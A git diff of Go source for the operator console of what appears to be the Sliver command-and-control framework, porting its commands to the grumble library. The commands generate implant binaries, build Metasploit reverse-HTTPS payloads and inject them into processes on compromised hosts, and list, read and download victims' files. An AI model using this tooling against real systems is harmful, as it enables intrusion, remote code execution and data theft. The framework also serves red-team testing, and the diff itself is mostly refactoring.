@@ -2,7 +2,6 @@ package main
 
 import (
 	"bytes"
-	"flag"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -14,13 +13,64 @@ import (
 	"text/tabwriter"
 	"text/template"
 
-	"github.com/chzyer/readline"
+	"github.com/desertbit/grumble"
 	"github.com/golang/protobuf/proto"
 )
 
-func helpCmd(term *readline.Instance, args []string) {
-	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(getHelpFor(args))
-	tmpl.Execute(term, struct {
+const (
+	helpStr       = "help"
+	sessionsStr   = "sessions"
+	backgroundStr = "background"
+	infoStr       = "info"
+	useStr        = "use"
+	generateStr   = "generate"
+	msfStr        = "msf"
+	injectStr     = "inject"
+	psStr         = "ps"
+	pingStr       = "ping"
+	killStr       = "kill"
+	lsStr         = "ls"
+	cdStr         = "cd"
+	pwdStr        = "pwd"
+	catStr        = "cat"
+	downloadStr   = "download"
+	uploadStr     = "upload"
+
+	// ANSI Colors
+	normal    = "\033[0m"
+	black     = "\033[30m"
+	red       = "\033[31m"
+	green     = "\033[32m"
+	orange    = "\033[33m"
+	blue      = "\033[34m"
+	purple    = "\033[35m"
+	cyan      = "\033[36m"
+	gray      = "\033[37m"
+	bold      = "\033[1m"
+	clearln   = "\r\x1b[2K"
+	upN       = "\033[%dA"
+	downN     = "\033[%dB"
+	underline = "\033[4m"
+
+	// Info - Display colorful information
+	Info = bold + cyan + "[*] " + normal
+	// Warn - Warn a user
+	Warn = bold + red + "[!] " + normal
+	// Debug - Display debug information
+	Debug = bold + purple + "[-] " + normal
+	// Woot - Display success
+	Woot = bold + green + "[$] " + normal
+)
+
+// ---------------------- Command Implementations ----------------------
+
+func helpCmd(ctx *grumble.Context) {
+	cmd := ""
+	if 0 < len(ctx.Args) {
+		cmd = ctx.Args[0]
+	}
+	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(getHelpFor(cmd))
+	tmpl.Execute(os.Stdout, struct {
 		Normal    string
 		Bold      string
 		Underline string
@@ -32,38 +82,24 @@ func helpCmd(term *readline.Instance, args []string) {
 
 }
 
-func sessionsCmd(term *readline.Instance, args []string) {
-	sessionsFlags := flag.NewFlagSet("sessions", flag.ContinueOnError)
-	interact := sessionsFlags.String("i", "", "iteract with sesssion")
-	sessionsFlags.Usage = func() { helpCmd(term, []string{"sessions"}) }
-	err := sessionsFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
-
-	if *interact != "" {
-		useCmd(term, []string{*interact})
+func sessionsCmd(ctx *grumble.Context) {
+	interact := ctx.Flags.String("interact")
+	if interact != "" {
+		setActiveSliver(ctx, interact)
 		return
 	}
 
 	if 0 < len(*hive) {
-		printSlivers(term)
+		printSlivers()
 	} else {
-		fmt.Fprintln(term, "\n"+Info+"No slivers connected\n")
+		fmt.Println("\n" + Info + "No slivers connected\n")
 	}
 }
 
-func backgroundCmd(term *readline.Instance, args []string) {
-	backgroundFlags := flag.NewFlagSet("background", flag.ContinueOnError)
-	backgroundFlags.Usage = func() { helpCmd(term, []string{"background"}) }
-	err := backgroundFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
+func backgroundCmd(ctx *grumble.Context) {
 	if activeSliver != nil {
 		activeSliver = nil
-		term.SetPrompt(getPrompt())
-		term.Refresh()
+		ctx.App.SetPrompt(getPrompt())
 	}
 }
 
@@ -76,7 +112,7 @@ func backgroundCmd(term *readline.Instance, args []string) {
 	write each line to the term and insert the ANSI codes just before
 	we display the row.
 */
-func printSlivers(term *readline.Instance) {
+func printSlivers() {
 	outputBuf := bytes.NewBufferString("")
 	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)
 
@@ -114,32 +150,25 @@ func printSlivers(term *readline.Instance) {
 		lines := strings.Split(outputBuf.String(), "\n")
 		for lineNumber, line := range lines {
 			if lineNumber == activeIndex {
-				fmt.Fprintf(term, "%s%s%s\n", green, line, normal)
+				fmt.Printf("%s%s%s\n", green, line, normal)
 			} else {
-				fmt.Fprintf(term, "%s\n", line)
+				fmt.Printf("%s\n", line)
 			}
 		}
 	} else {
-		fmt.Fprintln(term, outputBuf.String())
+		fmt.Println(outputBuf.String())
 	}
 }
 
-func killCmd(term *readline.Instance, args []string) {
-	killFlags := flag.NewFlagSet("kill", flag.ContinueOnError)
-	killFlags.Usage = func() { helpCmd(term, []string{"kill"}) }
-	err := killFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
-
+func killCmd(ctx *grumble.Context) {
 	var sliver *Sliver
 	if activeSliver != nil {
 		sliver = getSliver(strconv.Itoa(activeSliver.Id))
-	} else if 0 < len(args) {
-		sliver = getSliver(args[0])
+	} else if 0 < len(ctx.Args) {
+		sliver = getSliver(ctx.Args[0])
 	}
 	if sliver != nil {
-		fmt.Fprintf(term, "\n"+Info+"Killing sliver %s (%d)", sliver.Name, sliver.Id)
+		fmt.Printf("\n"+Info+"Killing sliver %s (%d)", sliver.Name, sliver.Id)
 		data, _ := proto.Marshal(&pb.KillReq{Id: randomId()})
 		(*sliver).Send <- pb.Envelope{
 			Type: "kill",
@@ -148,142 +177,125 @@ func killCmd(term *readline.Instance, args []string) {
 	}
 }
 
-func infoCmd(term *readline.Instance, args []string) {
-	infoFlags := flag.NewFlagSet("info", flag.ContinueOnError)
-	infoFlags.Usage = func() { helpCmd(term, []string{"info"}) }
-	err := infoFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
-
+func infoCmd(ctx *grumble.Context) {
 	var sliver *Sliver
 	if activeSliver != nil {
 		sliver = getSliver(strconv.Itoa(activeSliver.Id))
-	} else if 0 < len(args) {
-		sliver = getSliver(args[0])
+	} else if 0 < len(ctx.Args) {
+		sliver = getSliver(ctx.Args[0])
 	}
 	if sliver != nil {
-		fmt.Fprintln(term, "")
-		fmt.Fprintf(term, bold+"ID: %s%d\n", normal, sliver.Id)
-		fmt.Fprintf(term, bold+"Name: %s%s\n", normal, sliver.Name)
-		fmt.Fprintf(term, bold+"Hostname: %s%s\n", normal, sliver.Hostname)
-		fmt.Fprintf(term, bold+"Username: %s%s\n", normal, sliver.Username)
-		fmt.Fprintf(term, bold+"UID: %s%s\n", normal, sliver.Uid)
-		fmt.Fprintf(term, bold+"GID: %s%s\n", normal, sliver.Gid)
-		fmt.Fprintf(term, bold+"OS: %s%s\n", normal, sliver.Os)
-		fmt.Fprintf(term, bold+"Arch: %s%s\n", normal, sliver.Arch)
-		fmt.Fprintf(term, bold+"Remote Address: %s%s\n", normal, sliver.RemoteAddress)
-		fmt.Fprintln(term, "")
+		fmt.Println("")
+		fmt.Printf(bold+"ID: %s%d\n", normal, sliver.Id)
+		fmt.Printf(bold+"Name: %s%s\n", normal, sliver.Name)
+		fmt.Printf(bold+"Hostname: %s%s\n", normal, sliver.Hostname)
+		fmt.Printf(bold+"Username: %s%s\n", normal, sliver.Username)
+		fmt.Printf(bold+"UID: %s%s\n", normal, sliver.Uid)
+		fmt.Printf(bold+"GID: %s%s\n", normal, sliver.Gid)
+		fmt.Printf(bold+"OS: %s%s\n", normal, sliver.Os)
+		fmt.Printf(bold+"Arch: %s%s\n", normal, sliver.Arch)
+		fmt.Printf(bold+"Remote Address: %s%s\n", normal, sliver.RemoteAddress)
+		fmt.Println("")
 	} else {
-		fmt.Fprintln(term, "\n"+Warn+"Invalid sliver name")
+		fmt.Printf("\n" + Warn + "Invalid sliver name\n\n")
 	}
 }
 
-func useCmd(term *readline.Instance, args []string) {
-	useFlags := flag.NewFlagSet("use", flag.ContinueOnError)
-	useFlags.Usage = func() { helpCmd(term, []string{"use"}) }
-	err := useFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
-
-	if 0 < len(args) {
-		sliver := getSliver(args[0])
-		if sliver != nil {
-			activeSliver = sliver
-			term.SetPrompt(getPrompt())
-			term.Refresh()
-			fmt.Fprintf(term, "\n"+Info+"Active sliver set to '%s' (%d)\n", activeSliver.Name, activeSliver.Id)
-		} else {
-			fmt.Fprintf(term, "\n"+Warn+"No sliver with name '%s'\n", args[0])
-		}
+func useCmd(ctx *grumble.Context) {
+	if 0 < len(ctx.Args) {
+		setActiveSliver(ctx, ctx.Args[0])
 	} else {
-		fmt.Fprintln(term, "\n"+Warn+"Missing sliver name")
+		fmt.Printf("\n" + Warn + "Missing sliver name\n\n")
 	}
 }
 
-func generateCmd(term *readline.Instance, args []string) {
-	genFlags := flag.NewFlagSet("gen", flag.ContinueOnError)
-	target := genFlags.String("os", windowsPlatform, "operating system")
-	arch := genFlags.String("arch", "amd64", "cpu architecture (amd64/386)")
-	lhost := genFlags.String("lhost", *server, "sliver server listener lhost")
-	lport := genFlags.Int("lport", *serverLPort, "sliver server listner port")
-	debug := genFlags.Bool("debug", false, "generate a debug binary")
-	save := genFlags.String("save", "", "save binary file to path")
-	genFlags.Usage = func() { helpCmd(term, []string{"generate"}) }
-	err := genFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
+func setActiveSliver(ctx *grumble.Context, target string) {
+	sliver := getSliver(target)
+	if sliver != nil {
+		activeSliver = sliver
+		ctx.App.SetPrompt(getPrompt())
+		fmt.Printf("\n"+Info+"Active sliver set to '%s' (%d)\n\n", activeSliver.Name, activeSliver.Id)
+	} else {
+		fmt.Printf("\n"+Warn+"No sliver with name '%s'\n\n", target)
 	}
-	if *lhost == "" {
-		fmt.Fprintf(term, "\n"+Warn+"Invalid lhost '%s'\n", *lhost)
+}
+
+func generateCmd(ctx *grumble.Context) {
+
+	targetOS := ctx.Flags.String("os")
+	arch := ctx.Flags.String("arch")
+	lhost := ctx.Flags.String("lhost")
+	lport := ctx.Flags.Int("lport")
+	debug := ctx.Flags.Bool("debug")
+	save := ctx.Flags.String("save")
+
+	if lhost == "" {
+		fmt.Printf("\n"+Warn+"Invalid lhost '%s'\n", lhost)
 		return
 	}
 
-	fmt.Fprintf(term, "\n"+Info+"Generating new %s/%s sliver binary, please wait ... \n", *target, *arch)
-	path, err := GenerateImplantBinary(*target, *arch, *lhost, uint16(*lport), *debug)
+	fmt.Printf("\n"+Info+"Generating new %s/%s sliver binary, please wait ... \n", targetOS, arch)
+	path, err := GenerateImplantBinary(targetOS, arch, lhost, uint16(lport), debug)
 	if err != nil {
-		fmt.Fprintf(term, Warn+"Error generating sliver: %v\n", err)
+		fmt.Printf(Warn+"Error generating sliver: %v\n", err)
 	}
-	if save == nil || *save == "" {
-		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", path)
+	if save == "" {
+		fmt.Printf(Info+"Generated sliver binary at: %s\n\n", path)
 	} else {
-		saveTo, _ := filepath.Abs(*save)
-		fi, _ := os.Stat(saveTo)
+		saveTo, _ := filepath.Abs(save)
+		fi, err := os.Stat(saveTo)
+		if err != nil {
+			fmt.Printf(Warn+"Failed to generate sliver %v\n\n", err)
+			return
+		}
 		if fi.IsDir() {
 			filename := filepath.Base(path)
 			saveTo = filepath.Join(saveTo, filename)
 		}
 		err = copyFileContents(path, saveTo)
 		if err != nil {
-			fmt.Fprintf(term, Warn+"Failed to write to %s\n", saveTo)
+			fmt.Printf(Warn+"Failed to write to %s\n\n", saveTo)
 		}
-		fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", saveTo)
+		fmt.Printf(Info+"Generated sliver binary at: %s\n\n", saveTo)
 	}
 }
 
-func msfCmd(term *readline.Instance, args []string) {
-	msfFlags := flag.NewFlagSet("msf", flag.ContinueOnError)
-	payloadName := msfFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
-	lhost := msfFlags.String("lhost", "", "metasploit listener lhost")
-	lport := msfFlags.Int("lport", 4444, "metasploit listner port")
-	encoder := msfFlags.String("encoder", "", "metasploit encoder")
-	iterations := msfFlags.Int("iterations", 1, "metasploit encoder iterations")
-	msfFlags.Usage = func() { helpCmd(term, []string{"msf"}) }
-	err := msfFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
+func msfCmd(ctx *grumble.Context) {
+	payloadName := ctx.Flags.String("payload")
+	lhost := ctx.Flags.String("lhost")
+	lport := ctx.Flags.Int("lport")
+	encoder := ctx.Flags.String("encoder")
+	iterations := ctx.Flags.Int("iterations")
 
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
-	if *lhost == "" {
-		fmt.Fprintf(term, "\n"+Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
+	if lhost == "" {
+		fmt.Printf("\n"+Warn+"Invalid lhost '%s', see `help msf`\n", lhost)
 		return
 	}
 
-	fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
-		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
+	fmt.Printf("\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
+		payloadName, activeSliver.Os, activeSliver.Arch, lhost, lport)
 	config := msf.VenomConfig{
 		Os:         activeSliver.Os,
 		Arch:       msf.Arch(activeSliver.Arch),
-		Payload:    *payloadName,
-		LHost:      *lhost,
-		LPort:      uint16(*lport),
-		Encoder:    *encoder,
-		Iterations: *iterations,
+		Payload:    payloadName,
+		LHost:      lhost,
+		LPort:      uint16(lport),
+		Encoder:    encoder,
+		Iterations: iterations,
 	}
 	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
-		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
+		fmt.Printf(Warn+"Error while generating payload: %v\n", err)
 		return
 	}
-	fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
+	fmt.Printf(Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
 
-	fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
+	fmt.Printf(Info+"Sending payload -> %s\n", activeSliver.Name)
 	data, _ := proto.Marshal(&pb.Task{
 		Encoder: "raw",
 		Data:    rawPayload,
@@ -292,54 +304,48 @@ func msfCmd(term *readline.Instance, args []string) {
 		Type: "task",
 		Data: data,
 	}
-	fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
+	fmt.Printf(Info + "Sucessfully sent payload\n")
 
 }
 
-func injectCmd(term *readline.Instance, args []string) {
-	injectFlags := flag.NewFlagSet("inject", flag.ContinueOnError)
-	injectPid := injectFlags.Int("pid", 0, "pid to inject payload into")
-	payloadName := injectFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
-	lhost := injectFlags.String("lhost", "", "metasploit listener lhost")
-	lport := injectFlags.Int("lport", 4444, "metasploit listner port")
-	encoder := injectFlags.String("encoder", "", "metasploit encoder")
-	iterations := injectFlags.Int("iterations", 1, "metasploit encoder iterations")
-	injectFlags.Usage = func() { helpCmd(term, []string{"inject"}) }
-	err := injectFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
+func injectCmd(ctx *grumble.Context) {
+	injectPid := ctx.Flags.Int("pid")
+	payloadName := ctx.Flags.String("payload")
+	lhost := ctx.Flags.String("lhost")
+	lport := ctx.Flags.Int("lport")
+	encoder := ctx.Flags.String("encoder")
+	iterations := ctx.Flags.Int("iterations")
 
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
-	if *lhost == "" {
-		fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
+	if lhost == "" {
+		fmt.Printf(Warn+"Invalid lhost '%s', see `help msf`\n", lhost)
 		return
 	}
 
-	fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
-		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
+	fmt.Printf("\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
+		payloadName, activeSliver.Os, activeSliver.Arch, lhost, lport)
 	config := msf.VenomConfig{
 		Os:         activeSliver.Os,
 		Arch:       msf.Arch(activeSliver.Arch),
-		Payload:    *payloadName,
-		LHost:      *lhost,
-		LPort:      uint16(*lport),
-		Encoder:    *encoder,
-		Iterations: *iterations,
+		Payload:    payloadName,
+		LHost:      lhost,
+		LPort:      uint16(lport),
+		Encoder:    encoder,
+		Iterations: iterations,
 	}
 	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
-		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
+		fmt.Printf(Warn+"Error while generating payload: %v\n", err)
 		return
 	}
-	fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
+	fmt.Printf(Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
 
-	fmt.Fprintf(term, Info+"Sending payload -> %s -> PID: %d\n", activeSliver.Name, *injectPid)
+	fmt.Printf(Info+"Sending payload -> %s -> PID: %d\n", activeSliver.Name, injectPid)
 	data, _ := proto.Marshal(&pb.RemoteTask{
-		Pid:     int32(*injectPid),
+		Pid:     int32(injectPid),
 		Encoder: "raw",
 		Data:    rawPayload,
 	})
@@ -347,66 +353,61 @@ func injectCmd(term *readline.Instance, args []string) {
 		Type: "remoteTask",
 		Data: data,
 	}
-	fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
+	fmt.Printf(Info + "Sucessfully sent payload\n")
 
 }
 
-func psCmd(term *readline.Instance, args []string) {
-	psFlags := flag.NewFlagSet("ps", flag.ContinueOnError)
-	pidFilter := psFlags.Int("pid", -1, "find proc by pid")
-	exeFilter := psFlags.String("exe", "", "filter procs by name")
-	psFlags.Usage = func() { helpCmd(term, []string{"ps"}) }
-	err := psFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
+func psCmd(ctx *grumble.Context) {
+
+	pidFilter := ctx.Flags.Int("pid")
+	exeFilter := ctx.Flags.String("exe")
 
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
-	fmt.Fprintf(term, Info+"Requesting process list from %s ...\n", activeSliver.Name)
+	fmt.Printf(Info+"Requesting process list from %s ...\n", activeSliver.Name)
 
 	reqId := randomId()
 	data, _ := proto.Marshal(&pb.ProcessListReq{Id: reqId})
 	envelope, err := activeSliverRequest("psReq", reqId, data)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Error: %s", err)
+		fmt.Printf("\n"+Warn+"Error: %s", err)
 		return
 	}
 
 	psList := &pb.ProcessList{}
 	err = proto.Unmarshal(envelope.Data, psList)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
 		return
 	}
 
 	header := fmt.Sprintf("\n% 6s | % 6s | % 40s | %s\n", "pid", "ppid", "executable", "owner")
-	fmt.Fprintf(term, header)
-	fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(header)))
+	fmt.Printf(header)
+	fmt.Printf("%s\n", strings.Repeat("=", len(header)))
 	for _, proc := range psList.Processes {
-		if *pidFilter != -1 {
-			if proc.Pid == int32(*pidFilter) {
-				printProcInfo(term, proc)
+		if pidFilter != -1 {
+			if proc.Pid == int32(pidFilter) {
+				printProcInfo(proc)
 			}
 		}
-		if *exeFilter != "" {
-			if strings.HasPrefix(proc.Executable, *exeFilter) {
-				printProcInfo(term, proc)
+		if exeFilter != "" {
+			if strings.HasPrefix(proc.Executable, exeFilter) {
+				printProcInfo(proc)
 			}
 		}
-		if *pidFilter == -1 && *exeFilter == "" {
-			printProcInfo(term, proc)
+		if pidFilter == -1 && exeFilter == "" {
+			printProcInfo(proc)
 		}
 	}
-	fmt.Fprintf(term, "\n")
+	fmt.Printf("\n")
 
 }
 
 // printProcInfo - Stylizes the process information
-func printProcInfo(term *readline.Instance, proc *pb.Process) {
+func printProcInfo(proc *pb.Process) {
 	color := normal
 	if modifyColor, ok := knownProcs[proc.Executable]; ok {
 		color = modifyColor
@@ -414,26 +415,19 @@ func printProcInfo(term *readline.Instance, proc *pb.Process) {
 	if proc.Pid == activeSliver.Pid {
 		color = green
 	}
-	fmt.Fprintf(term, "%s%s% 6d%s%s | % 6d | % 40s%s | %s%s%s\n",
+	fmt.Printf("%s%s% 6d%s%s | % 6d | % 40s%s | %s%s%s\n",
 		color, bold, proc.Pid, normal, color, proc.Ppid, proc.Executable, normal, color, proc.Owner, normal)
 }
 
-func pingCmd(term *readline.Instance, args []string) {
-	pingFlags := flag.NewFlagSet("ping", flag.ContinueOnError)
-	pingFlags.Usage = func() { helpCmd(term, []string{"ping"}) }
-	err := pingFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
-
+func pingCmd(ctx *grumble.Context) {
 	var sliver *Sliver
 	if activeSliver != nil {
 		sliver = getSliver(strconv.Itoa(activeSliver.Id))
-	} else if 0 < len(args) {
-		sliver = getSliver(args[0])
+	} else if 0 < len(ctx.Args) {
+		sliver = getSliver(ctx.Args[0])
 	}
 	if sliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Invalid sliver name\n")
+		fmt.Println("\n" + Warn + "Invalid sliver name\n")
 		return
 	}
 
@@ -441,68 +435,60 @@ func pingCmd(term *readline.Instance, args []string) {
 	data, _ := proto.Marshal(&pb.Ping{Id: reqId})
 	envelope, err := activeSliverRequest("ping", reqId, data)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Error: %s\n", err)
+		fmt.Printf("\n"+Warn+"Error: %s\n", err)
 		return
 	}
 
 	pong := &pb.Ping{}
 	err = proto.Unmarshal(envelope.Data, pong)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
 		return
 	}
-	fmt.Fprintf(term, "\n"+Info+"Ping/Pong with ID = %s\n", pong.Id)
+	fmt.Printf("\n"+Info+"Ping/Pong with ID = %s\n", pong.Id)
 
 }
 
-func lsCmd(term *readline.Instance, args []string) {
-	lsFlags := flag.NewFlagSet("ls", flag.ContinueOnError)
-	lsFlags.Usage = func() { helpCmd(term, []string{"ls"}) }
-	args = lsFlags.Args()
-	err := lsFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
-
+func lsCmd(ctx *grumble.Context) {
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
-	if len(args) < 1 {
-		args = append(args, ".")
+	if len(ctx.Args) < 1 {
+		ctx.Args = append(ctx.Args, ".")
 	}
 
 	reqId := randomId()
 	data, _ := proto.Marshal(&pb.DirListReq{
 		Id:   reqId,
-		Path: args[0],
+		Path: ctx.Args[0],
 	})
 	envelope, err := activeSliverRequest("dirListReq", reqId, data)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Error: %s\n", err)
+		fmt.Printf("\n"+Warn+"Error: %s\n", err)
 		return
 	}
 	dirList := &pb.DirList{}
 	err = proto.Unmarshal(envelope.Data, dirList)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
 		return
 	}
 
 	if dirList.Exists {
-		printDirList(term, dirList)
+		printDirList(dirList)
 	} else {
-		fmt.Fprintf(term, "\n"+Warn+"Directory does not exist (%s)\n", dirList.Path)
+		fmt.Printf("\n"+Warn+"Directory does not exist (%s)\n", dirList.Path)
 	}
 
 }
 
-func printDirList(term *readline.Instance, dirList *pb.DirList) {
-	fmt.Fprintf(term, "\n%s\n", dirList.Path)
-	fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(dirList.Path)))
+func printDirList(dirList *pb.DirList) {
+	fmt.Printf("\n%s\n", dirList.Path)
+	fmt.Printf("%s\n", strings.Repeat("=", len(dirList.Path)))
 
-	table := tabwriter.NewWriter(term, 0, 2, 2, ' ', 0)
+	table := tabwriter.NewWriter(os.Stdout, 0, 2, 2, ' ', 0)
 	for _, fileInfo := range dirList.Files {
 		if fileInfo.IsDir {
 			fmt.Fprintf(table, "%s\t<dir>\t\n", fileInfo.Name)
@@ -511,55 +497,48 @@ func printDirList(term *readline.Instance, dirList *pb.DirList) {
 		}
 	}
 	table.Flush()
-	fmt.Fprintln(term)
+	fmt.Println()
 }
 
-func cdCmd(term *readline.Instance, args []string) {
-	cdFlags := flag.NewFlagSet("cd", flag.ContinueOnError)
-	cdFlags.Usage = func() { helpCmd(term, []string{"cd"}) }
-	err := cdFlags.Parse(args)
-	if err == flag.ErrHelp {
+func cdCmd(ctx *grumble.Context) {
+
+	if len(ctx.Args) < 1 {
 		return
 	}
+
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
 	reqId := randomId()
 	data, _ := proto.Marshal(&pb.CdReq{
 		Id:   reqId,
-		Path: args[0],
+		Path: ctx.Args[0],
 	})
 	envelope, err := activeSliverRequest("cdReq", reqId, data)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Error: %s\n", err)
+		fmt.Printf("\n"+Warn+"Error: %s\n", err)
 		return
 	}
 	pwd := &pb.Pwd{}
 	err = proto.Unmarshal(envelope.Data, pwd)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
 		return
 	}
 
 	if pwd.Err == "" {
-		fmt.Fprintln(term, "\n"+Info+pwd.Path+"\n")
+		fmt.Println("\n" + Info + pwd.Path + "\n")
 	} else {
-		fmt.Fprintln(term, "\n"+Warn+pwd.Err+"\n")
+		fmt.Println("\n" + Warn + pwd.Err + "\n")
 	}
 
 }
 
-func pwdCmd(term *readline.Instance, args []string) {
-	pwdFlags := flag.NewFlagSet("pwd", flag.ContinueOnError)
-	pwdFlags.Usage = func() { helpCmd(term, []string{"pwd"}) }
-	err := pwdFlags.Parse(args)
-	if err == flag.ErrHelp {
-		return
-	}
+func pwdCmd(ctx *grumble.Context) {
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
@@ -567,73 +546,63 @@ func pwdCmd(term *readline.Instance, args []string) {
 	data, _ := proto.Marshal(&pb.PwdReq{Id: reqId})
 	envelope, err := activeSliverRequest("pwdReq", reqId, data)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Error: %s", err)
+		fmt.Printf("\n"+Warn+"Error: %s", err)
 		return
 	}
 	pwd := &pb.Pwd{}
 	err = proto.Unmarshal(envelope.Data, pwd)
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		fmt.Printf("\n"+Warn+"Unmarshaling envelope error: %v\n", err)
 		return
 	}
 
 	if pwd.Err == "" {
-		fmt.Fprintln(term, "\n"+Info+pwd.Path+"\n")
+		fmt.Println("\n" + Info + pwd.Path + "\n")
 	} else {
-		fmt.Fprintln(term, "\n"+Warn+pwd.Err+"\n")
+		fmt.Println("\n" + Warn + pwd.Err + "\n")
 	}
 
 }
 
-func catCmd(term *readline.Instance, args []string) {
-	catFlags := flag.NewFlagSet("cat", flag.ContinueOnError)
-	catFlags.Usage = func() { helpCmd(term, []string{"cat"}) }
-	err := catFlags.Parse(args)
-	args = catFlags.Args()
-	if err == flag.ErrHelp {
-		return
+func catCmd(ctx *grumble.Context) {
+
+	if len(ctx.Args) < 1 {
+		fmt.Println("\n" + Warn + "Missing file parameter\n")
 	}
 
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
-	if len(args) < 1 {
-		fmt.Fprintf(term, "\n"+Warn+"Missing path parameter\n")
+	if len(ctx.Args) < 1 {
+		fmt.Printf("\n" + Warn + "Missing path parameter\n")
 	}
-	data, err := activeSliverDownload(args[0])
+	data, err := activeSliverDownload(ctx.Args[0])
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Error: %v\n", err)
+		fmt.Printf("\n"+Warn+"Error: %v\n", err)
 	}
-	fmt.Fprintln(term, string(data))
+	fmt.Println(string(data))
 }
 
-func downloadCmd(term *readline.Instance, args []string) {
-	downloadFlags := flag.NewFlagSet("download", flag.ContinueOnError)
-	downloadFlags.Usage = func() { helpCmd(term, []string{"download"}) }
-	err := downloadFlags.Parse(args)
-	args = downloadFlags.Args()
-	if err == flag.ErrHelp {
-		return
-	}
+func downloadCmd(ctx *grumble.Context) {
 
 	if activeSliver == nil {
-		fmt.Fprintln(term, "\n"+Warn+"Please select an active sliver via `use`\n")
+		fmt.Println("\n" + Warn + "Please select an active sliver via `use`\n")
 		return
 	}
 
-	if len(args) < 2 {
-		fmt.Fprintf(term, "\n"+Warn+"Missing parameter\n")
+	if len(ctx.Args) < 2 {
+		fmt.Printf("\n" + Warn + "Missing parameter\n")
 	}
-	data, err := activeSliverDownload(args[0])
+	data, err := activeSliverDownload(ctx.Args[0])
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"Error: %v\n", err)
+		fmt.Printf("\n"+Warn+"Error: %v\n", err)
 	}
 
-	f, err := os.Create(args[1])
+	f, err := os.Create(ctx.Args[1])
 	if err != nil {
-		fmt.Fprintf(term, "\n"+Warn+"File write failture %s\n", err)
+		fmt.Printf("\n"+Warn+"File write failture %s\n", err)
 	}
